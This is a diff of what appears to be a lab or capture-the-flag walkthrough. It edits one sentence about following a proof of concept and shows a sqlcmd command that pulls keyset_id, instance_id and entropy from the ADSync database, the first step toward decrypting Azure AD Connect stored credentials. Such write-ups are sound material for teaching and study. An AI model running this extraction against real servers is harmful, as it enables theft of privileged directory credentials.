@@ -553,7 +553,7 @@ d-----         1/2/2020   2:53 PM                Resources
 -a----        2/11/2012   9:53 AM         259672 SQLCMD.EXE
 -a----        8/15/2017   9:56 PM         278216 xmlrw.dll
 ```
-All right, so we've got the same program `SQLCMD.EXE` as described in the article. If you followed the article, the author actually goes on to mention that the credentials we really want are inside a field called `encrypted_configuration`. Let's see if we can look in those fields:
+All right, so we've got the same program `SQLCMD.EXE` as described in the article. Let's see if we can follow the POC and use `SQLCMD.exe` to extract `keyset_id, instance_id, entropy` for Step 1:
 ```
 sqlcmd.exe -d ADSync -q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
 ```
